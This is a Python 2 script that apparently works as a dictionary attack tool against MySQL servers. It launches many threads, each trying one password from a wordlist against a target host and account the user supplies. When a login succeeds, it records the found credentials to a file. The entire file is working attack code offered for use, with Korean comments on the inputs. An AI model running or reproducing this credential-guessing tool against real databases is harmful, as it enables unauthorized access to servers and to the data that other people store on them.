#-*- coding: utf-8 -*-
import pymysql, threading, time

def Crack(Password, Target, Port, Account, DBName, DictionaryFile, SaveFile):
    try:
        print "\nTry : "+Password
        conn=pymysql.connect(host=Target, port=Port, user=Account, password=Password, db=DBName, charset="utf8")
        curs=conn.cursor()
    except Exception, e:
        print "\n[-]", e
        return
    fp=open(SaveFile, "w")
    fp.write("Target : "+Target+"\nPort : "+str(Port)+"\nDBName : "+DBName+"\nAccount : "+Account+"\nPassword : "+Password)
    fp.close()
    print "\n\n--------------------------------------------------------------\nTarget : "+Target+"\nPort : "+str(Port)+"\nDBName : "+DBName+"\nAccount : "+Account+"\nPassword : "+Password+"\n--------------------------------------------------------------\n[+] Open the "+SaveFile+"\n"
    conn.close()
    time.sleep(600)
    exit(0)

def main():
    try:
        Target=raw_input("Input Target IP : ") # 타겟 DB 서버IP
        Port=raw_input("Input Target Port(If you choose default(3306) to enter) : ") # DB 포트
        if(Port==""):
            Port=3306
        else:
            Port=int(Port)
        Account=raw_input("Input Account : ") # 타겟 DB 계정
        DBName=raw_input("Input Database Name(If you choose default(mysql) to enter) : ") # DB 이름
        if(DBName==""):
            DBName="mysql"
        DictionaryFile="C:\\Python27\\dist\\abc.txt"#raw_input("Input Dictionary File : ") # 사전파일
        SaveFile="C:\\Python27\\dist\\save.txt"#raw_input("Input Save File : ") # 결과를 저장할 파일
        threads=[]
        fp=open(DictionaryFile, "r")
        for password in fp.readlines():
            th=threading.Thread(target=Crack, args=(password.strip(), Target, Port, Account, DBName, DictionaryFile, SaveFile, ))
            th.start()
            if(len(threads) > 300):
                for th in threads:
                    th.join()
                threads=[]
        for th in threads:
            th.join()
        fp.close()
        time.sleep(600)
    except Exception, e:
        print "[-] ", e
        time.sleep(600)
        exit(0)
        
if __name__=="__main__":
    main()
